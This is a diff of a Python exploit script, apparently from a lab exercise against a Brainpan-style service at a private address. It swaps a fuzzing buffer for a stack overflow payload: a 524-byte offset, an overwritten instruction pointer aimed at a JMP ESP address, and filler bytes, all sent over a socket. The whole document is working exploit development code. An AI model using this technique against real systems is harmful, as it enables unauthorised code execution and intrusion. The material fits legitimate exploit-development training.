@@ -4,7 +4,12 @@ from termcolor import colored
 
 HOST = "192.168.0.6"
 PORT = 9999 
-buf = b"A" * 1000
+
+offset = b"A" * 524
+EIP = b"\xf3\x12\x17\x31" #0x311712F3 bianpan JMP ESP address
+JUNK = b"CCCC"
+
+payload = offset + EIP + JUNK
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -21,5 +26,7 @@ print(colored("[+] Connection successful!","yellow"))
 
 s.recv(1024)
 
+s.send(payload)
+
 print(colored("[+] Sending buffer...","yellow"))
-s.send(buf)
+s.recv(1024)
